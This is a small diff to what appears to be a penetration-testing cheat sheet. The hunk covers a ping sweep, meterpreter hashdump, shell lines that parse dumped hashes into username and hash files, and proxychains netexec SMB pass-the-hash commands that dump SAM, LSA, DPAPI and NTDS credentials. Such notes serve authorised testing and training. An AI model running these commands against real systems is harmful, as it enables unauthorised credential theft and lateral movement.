@@ -625,9 +625,9 @@ for /L %i in (1,1,254) do ping -n 1 192.168.1.%i
 [*] Pass The Hash
 meterpreter> hashdump
 
-HASHDUMP=''
-echo "$HASHDUMP" | cut -d ':' -f 1 | tee usernames
-echo "$HASHDUMP" | cut -d ':' -f 3- | sed 's/::.*//' | tee hashes
+DUMP=''
+echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
+echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes
 
 proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
